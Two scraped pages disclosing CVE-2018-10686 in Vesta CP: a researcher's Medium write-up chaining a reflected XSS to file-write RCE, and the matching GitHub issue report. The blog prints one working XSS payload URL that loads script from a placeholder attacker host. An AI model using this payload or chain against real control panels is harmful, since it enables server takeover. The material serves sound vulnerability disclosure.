=== Content from medium.com_a0c264b4_20250125_011751.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fd96d95c2bde2&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40ndrbasi%2Fcve-2018-10686-vestacp-rce-d96d95c2bde2&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40ndrbasi%2Fcve-2018-10686-vestacp-rce-d96d95c2bde2&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# CVE-2018â€“10686: Vesta CP 0.9.8â€“20 rXSS to RCE

[![Andrea Basile](https://miro.medium.com/v2/resize:fill:88:88/1*a-SEub_iC2XvlqKUt0JA3A.png)](/%40ndrbasi?source=post_page---byline--d96d95c2bde2--------------------------------)

[Andrea Basile](/%40ndrbasi?source=post_page---byline--d96d95c2bde2--------------------------------)

Â·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F8ab5642dda9f&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40ndrbasi%2Fcve-2018-10686-vestacp-rce-d96d95c2bde2&user=Andrea+Basile&userId=8ab5642dda9f&source=post_page-8ab5642dda9f--byline--d96d95c2bde2---------------------post_header-----------)

3 min readÂ·May 5, 2018

--

Listen

Share

*You shouldnâ€™t read this. Itâ€™s boring.*

![]()

This film shares a lot with this article: they both have catchy names but are boring af.

# The Plot: Exposition

Vesta CP itâ€™s a lightweight open-source control panel supported by Digital Ocean and others. This vulnerability lied there for about 2 years, I havenâ€™t checked in which version it was introduced.

![]()

web/view/file/index.php

Well, the plot itâ€™s quite scholastic, our prerequisites are introduced:

1. `$_SESSION['FILEMANAGER_KEY']` has to be there and not empty. FileManager itâ€™s a commercial plugin that Vesta sells for 3$/mo. Anyway people figured these checks are a joke and there is plenty of HOW-TO on forums.
2. Victim logged.

On line 40 `$path` itâ€™s injected there without any sanitization, resulting in a reflected XSS.

# The Plot: Rising action

![]()

Donâ€™t you feel the adrenaline?

> *>Okay, what should we do with this XSS?*
>
> **>***Why not trying to upload a PHP shell, thus gaining RCE, luv?*
>
> > Sounds good to meðŸ’–.

Vesta CP handle uploads with a slightly customized version of this [file-upload plugin](https://github.com/blueimp/jQuery-File-Upload). By randomly trying to upload things, apparently, you can only upload in /tmp or /home/$victim. Which makes sense since this is a control panel. But maybe we can achieve something more?

Letâ€™s check the source!

![]()

web/upload/UploadHandler.php

The branch we end at is line 1130, *v-copy-file* itâ€™s called with the victim username, file, path.

![]()

bin/v-copy-fs-file

line 44 prevents us from playing games with symlinks, but we really donâ€™t have to ðŸ™ƒ. Back to *web/upload/UploadHandler.php:1121* if the file already exists, then ***file\_put\_contents()*** itâ€™s called, without any controls except for these two:

1. **Content-Range** header sent
2. Our file being bigger than the current one.

This means we can write wherever PHP can, and that isnâ€™t good for a control panel, innit?

# The Plot: Resolution

Putting all the pieces together, an attacker just needs to trick the victim into clicking on something like:

`http://victim.site:8083/view/file/index.php?path=x" onerror=$.getScript("http://attacker.site/malicious.js") style="`

with `malicious.js` being something like:

![]()

malicious.js

Hence gaining RCE.

> ***>kthxbai***

**Notes:** *Recently Vesta has been exploited in the wild with an RCE, this bug has nothing to with it; but I may write something about it, since a lot of people on twitter talked nonsense about what couldâ€™ve been the cause.*

[PHP](/tag/php?source=post_page-----d96d95c2bde2--------------------------------)[Exploit](/tag/exploit?source=post_page-----d96d95c2bde2--------------------------------)[Vulnerability](/tag/vulnerability?source=post_page-----d96d95c2bde2--------------------------------)[Cve](/tag/cve?source=post_page-----d96d95c2bde2--------------------------------)

--

--

[![Andrea Basile](https://miro.medium.com/v2/resize:fill:96:96/1*a-SEub_iC2XvlqKUt0JA3A.png)](/%40ndrbasi?source=post_page---post_author_info--d96d95c2bde2--------------------------------)[![Andrea Basile](https://miro.medium.com/v2/resize:fill:128:128/1*a-SEub_iC2XvlqKUt0JA3A.png)](/%40ndrbasi?source=post_page---post_author_info--d96d95c2bde2--------------------------------)Follow[## Written by Andrea Basile](/%40ndrbasi?source=post_page---post_author_info--d96d95c2bde2--------------------------------)[6 Followers](/%40ndrbasi/followers?source=post_page---post_author_info--d96d95c2bde2--------------------------------)Â·[31 Following](/%40ndrbasi/following?source=post_page---post_author_info--d96d95c2bde2--------------------------------)

place where i write stuff about bugs i didnâ€™t manage/care to sell (as ifâ€¦)

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----d96d95c2bde2--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----d96d95c2bde2--------------------------------)[About](/about?autoplay=1&source=post_page-----d96d95c2bde2--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----d96d95c2bde2--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----d96d95c2bde2--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----d96d95c2bde2--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----d96d95c2bde2--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----d96d95c2bde2--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----d96d95c2bde2--------------------------------)[Teams](/business?source=post_page-----d96d95c2bde2--------------------------------)



=== Content from github.com_ad2819eb_20250125_011750.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Foutroll%2Fvesta%2Fissues%2F1558)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Foutroll%2Fvesta%2Fissues%2F1558)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=outroll%2Fvesta)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[outroll](/outroll)
/
**[vesta](/outroll/vesta)**
Public

* [Notifications](/login?return_to=%2Foutroll%2Fvesta) You must be signed in to change notification settings
* [Fork
  1k](/login?return_to=%2Foutroll%2Fvesta)
* [Star
   3k](/login?return_to=%2Foutroll%2Fvesta)

* [Code](/outroll/vesta)
* [Issues
  387](/outroll/vesta/issues)
* [Pull requests
  31](/outroll/vesta/pulls)
* [Discussions](/outroll/vesta/discussions)
* [Actions](/outroll/vesta/actions)
* [Projects
  0](/outroll/vesta/projects)
* [Security](/outroll/vesta/security)
* [Insights](/outroll/vesta/pulse)

Additional navigation options

* [Code](/outroll/vesta)
* [Issues](/outroll/vesta/issues)
* [Pull requests](/outroll/vesta/pulls)
* [Discussions](/outroll/vesta/discussions)
* [Actions](/outroll/vesta/actions)
* [Projects](/outroll/vesta/projects)
* [Security](/outroll/vesta/security)
* [Insights](/outroll/vesta/pulse)

# Vesta CP 0.9.8â€“20 rXSS toÂ RCEÂ #1558

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Vesta CP 0.9.8â€“20 rXSS toÂ RCE](#top)#1558Copy linkAssignees [![serghey-rodin](https://avatars.githubusercontent.com/u/844452?s=64&v=4)](/serghey-rodin)[![@r0xen](https://avatars.githubusercontent.com/u/8234144?v=4&size=80)](/r0xen)
## Description

[![@r0xen](https://avatars.githubusercontent.com/u/8234144?v=4&size=48)](/r0xen)[r0xen](https://github.com/r0xen)opened [on May 4, 2018](https://github.com/outroll/vesta/issues/1558#issue-320234711)

Hi,

there is a reflected XSS on <https://github.com/serghey-rodin/vesta/blob/master/web/view/file/index.php> line 40, $path.

The issue can be used to upload a PHP file, hence gaining RCE. Despite during a "normal" file upload <https://github.com/serghey-rodin/vesta/blob/master/web/upload/UploadHandler.php> calls *"v-copy-fs-file"* (line 1130) and <https://github.com/serghey-rodin/vesta/blob/master/bin/v-copy-fs-file> controls that the destination path is in /tmp or /home/$user/, an attacker could upload an existing file, this way triggering file\_put\_contents() (line 1120/1121) and gaining the ability to write wherever PHP can.

## Metadata

### Assignees

* [![@serghey-rodin](https://avatars.githubusercontent.com/u/844452?s=64&v=4)serghey-rodin](/serghey-rodin)
### Labels

No labelsNo labels
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.


